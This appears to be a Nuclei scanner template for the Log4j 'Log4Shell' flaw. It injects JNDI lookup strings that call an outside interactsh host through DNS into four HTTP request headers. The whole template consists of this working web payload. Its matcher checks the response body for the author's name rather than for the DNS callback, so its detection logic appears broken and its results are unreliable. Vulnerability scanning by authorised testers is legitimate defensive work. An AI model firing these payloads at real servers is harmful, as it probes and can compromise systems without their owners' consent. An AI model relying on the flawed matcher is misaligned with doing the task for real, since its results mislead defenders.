id: dns-log4j

info:
  name: dns log4j RCE
  author: Omkar7505
  severity: critical
  tags: rce

requests:
- raw:
  - |+
    GET / HTTP/1.1
    Host: {{Hostname}}
    User-agent: ${jndi:dns://{{Hostname}}.{{interactsh-url}}/a}
    X-Forwarded-For: ${jndi:dns://{{Hostname}}.{{interactsh-url}}/a}
    Referer: ${jndi:dns://{{Hostname}}.{{interactsh-url}}/a}
    X-Api-Version: ${jndi:dns://{{Hostname}}.{{interactsh-url}}/a}

  matchers:
  - type: word
    part: body
    words:
      - "Omkar7505"
